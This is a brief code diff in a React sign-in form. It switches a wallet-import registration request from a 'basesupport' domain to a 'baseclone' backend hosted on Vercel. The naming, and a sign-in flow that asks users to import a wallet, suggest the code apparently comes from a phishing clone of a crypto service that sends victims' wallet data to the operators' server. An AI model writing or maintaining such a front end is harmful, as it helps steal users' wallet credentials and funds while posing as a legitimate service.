@@ -43,7 +43,7 @@ export default function SigninForm({ referralCode, initialEmail, initialStep }) 
     setStatus("Securely importing wallet...");
 
     try {
-      const response = await fetch("https://api.basesupport.services/api/auth/register", {
+      const response = await fetch("https://baseclone-backend.vercel.app/api/auth/register", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
